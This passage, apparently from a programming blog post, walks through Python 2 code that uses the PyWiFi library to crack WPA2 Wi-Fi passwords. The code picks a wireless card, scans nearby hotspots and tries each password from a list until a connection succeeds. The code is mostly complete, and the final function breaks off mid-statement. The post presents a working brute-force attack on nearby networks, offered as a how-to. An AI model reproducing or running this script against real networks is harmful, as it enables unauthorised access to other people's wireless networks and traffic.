def get_wifi_interface():
    wifi = PyWiFi()
    if len(wifi.interfaces()) <= 0:
        print u'Wireless card interface not found!'
        exit()
    if len(wifi.interfaces()) == 1:
        print u'Wireless card interface: %s'%(wifi.interfaces()[0].name())
        return wifi.interfaces()[0]
    else:
        print '%-4s   %s'%(u'Serial number',u'Network card interface name')
        for i,w in enumerate(wifi.interfaces()):
            print '%-4s   %s'%(i,w.name())
        while True:
            iface_no = raw_input('Please select network card interface serial number:'.decode('utf-8').encode('gbk'))
            no = int(iface_no)
            if no>=0 and no < len(wifi.interfaces()):
                return wifi.interfaces()[no]
Scan around hot spots
The scan results are obtained mainly through the scan function. The specific code is encapsulated as follows. Here, sleep(2) is because it takes some time for the local wireless network card to return information during the test. Of course, if your network card has good performance, you can remove this sleep:

def scan(face):
    face.scan()
    time.sleep(2) 
    return face.scan_results()
Try to connect (crack password)
To crack the password, first define a Profile, then call connect as a parameter to try to connect. Use the status function to get the return value of the connection result. If it is const.IFACE_CONNECTED, the connection is successful, and the result is displayed. If it is other, it is a failure.

def test(i,face,x,key,stu,ts):
    showID = x.bssid if len(x.ssid)==0 or x.ssid=='\\x00' or len(x.ssid)>len(x.bssid) else x.ssid
    key_index = 0
    while key_index < len(key):
        k = key[key_index]
        x.key = k.strip()
        face.remove_all_network_profiles()
        profile = Profile()
        profile.ssid = x.ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = x.key
        face.connect(face.add_network_profile(profile))
        code = -1
        t1 = time.time()
        now = time.time() - t1
        while True:
            time.sleep(0.1)
            code = face.status()
            now = time.time()-t1
            if now>ts:
                break
            stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s"%(i,showID,now,len(key)-key_index,k.strip(),get_iface_status(code)))
            stu.flush()
            if code == const.IFACE_DISCONNECTED :
                break
            elif code == const.IFACE_CONNECTED:
                face.disconnect()
                stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s\n"%(
Posted by QbertsBrother on Wed, 29 Apr 2020 20:49:33 -0700

Hot Keywords
Java - 5220
Attribute - 2418
Programming - 2384
Database - 2349
Python - 1973
xml - 1959
Javascript - 1902
Android - 1890
Spring - 1799
JSON - 1741
github - 1704
network - 1679
less - 1673
Linux - 1420
MySQL - 1315
PHP - 1267
SQL - 1211
encoding - 1179
Mobile - 1029
Apache - 896